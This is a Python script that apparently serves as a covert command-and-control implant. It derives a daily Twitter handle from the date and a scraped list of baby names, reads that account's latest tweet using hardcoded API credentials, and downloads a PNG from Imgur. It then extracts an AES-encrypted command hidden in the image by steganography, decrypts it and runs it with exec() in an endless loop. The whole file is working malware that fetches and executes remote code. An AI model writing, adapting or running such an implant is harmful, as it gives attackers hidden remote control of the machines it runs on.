import tweepy
import datetime
from bs4 import BeautifulSoup
from urllib.request import urlopen
import urllib
import base64
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
from stegano import lsbset
from stegano.lsbset import generators
import requests

def handle_generator():
    date_datetype = datetime.datetime.now()

    month = int(str(date_datetype)[5:7])
    day = int(str(date_datetype)[8:10])
    year = int(str(date_datetype)[0:4])

    position = (day + month)*3
    if position > 100:
        position = position - 100

    prestring = str(6*month) + str(3*day)

    poststring = str(int((2*year)/3))

    poslength = len(str(position))
    offset = poslength + 2

    page = urlopen('https://www.familyeducation.com/baby-names/top-names/boy')
    soup = BeautifulSoup(page, 'html.parser')

    for ul in soup.find_all('ul', class_='static-top-names part1'):
        line = ul.text

    start = line.find(str(position)+'.')

    if start < 0:
        for ul in soup.find_all('ul', class_='static-top-names part2'):
            line = ul.text

    start = line.find(str(position)+'.')

    start = start+offset
    end = line.find('\n', start)
    name = (line[start:end])

    handle = prestring + name + poststring

    return handle

def twitter_checker(handle):
    conn = requests.head("https://twitter.com/" + handle)

    if conn.status_code == 200:
        return True
    else:
        return False

def tweet_grabber(handle):
    auth = tweepy.AppAuthHandler('l6YWEnCAUpbymznvHL7n5sz7F', 'VpYDAkRmLw8x2zerOGqBdVIhlrPpHta9wIySaQxWLQ3Dkp6YmY')
    api = tweepy.API(auth)
    tweet = api.user_timeline(id=handle, count='1')
    for x in tweet:
        tweet_text = x.text
    return tweet_text


def parser(tweet):
    tweet = tweet + " "
    key = ''
    url = ''

    for i in range(0, len(tweet)):
        if tweet[i] == ' ':
            continue
        elif tweet[i - 1] == ' ' and tweet[i + 1] == ' ':
            url = url + tweet[i]
        else:
            key = key + tweet[i]

    return key, url

def image_fetcher(file_name):
    base_url = "https://i.imgur.com/"
    full_file_name = file_name + '.png'
    image_url = base_url + full_file_name
    urllib.request.urlretrieve(image_url, full_file_name)
    return

def decrypter(key, fileprefix):

    filename = fileprefix + ".png"

    source = lsbset.reveal(filename, generators.eratosthenes())

    key = key.encode("ascii")

    source = base64.b64decode(source.encode("latin-1"))
    key = SHA256.new(key).digest()
    IV = source[:AES.block_size]
    decryptor = AES.new(key, AES.MODE_CBC, IV)
    data = decryptor.decrypt(source[AES.block_size:])
    padding = data[-1]
    data = data[:-padding]

    return (data.decode('ascii'))

def execution(command):
    exec(command)
    return True

exec_check = False
handle = ""
while 1:
    if handle != handle_generator():
        exec_check = False
        handle = handle_generator()
    if exec_check == True:
        continue
    if twitter_checker(handle) == False:
        continue
    tweet = tweet_grabber(handle)
    key, url = parser(tweet)
    image_fetcher(url)
    command = decrypter(key, url)
    exec_check = execution(command)




